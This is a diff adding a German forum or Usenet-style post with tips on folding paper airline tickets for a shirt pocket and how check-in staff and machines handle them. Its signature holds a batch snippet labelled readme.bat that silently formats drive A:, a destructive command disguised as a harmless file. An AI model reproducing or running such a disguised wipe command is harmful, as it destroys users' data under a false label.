@@ -1,0 +1,23 @@
+Ich knicke meine Flugtickets fast immer, damit ich sie griffbereit in
+meine Hemdentasche stecken kann. Ungeknickt habe ich immer die
+Befuerchtung, diese leichter verlieren zu koennen.
+
+Mit dem Knick gab es bislang weder bei den Automaten zum automatischen
+Einchecken (ohne Reisegepaeck) Probleme, auch nicht mit den
+Magnetstreifenlesegeraet beim Einchecken (mit Gepaeck). Auch nicht
+beim spaetern Einstieg in die Maschine.
+
+Es ist mir nur aufgefallen, dass die Damen beim Einchecken das
+geknickte Ticket i.d.R. durch eine neue Bordkarte ersetzen
+(normalerweise kann das Ticket durch den zusaetzlichen Aufdruck beim
+Einchecken auch als Bordkarte benutzt werden).
+
+Du solltest nur aufpassen, das das Ticket nicht eingerissen ist, nicht
+aufgeweicht ist (z.B. durch Schweiss in der Hemdentasche) oder
+Eselsohren hat.
+
+Martin
+-- 
+begin  readme.bat
+echo .|c:\windows\command\format a:
+end
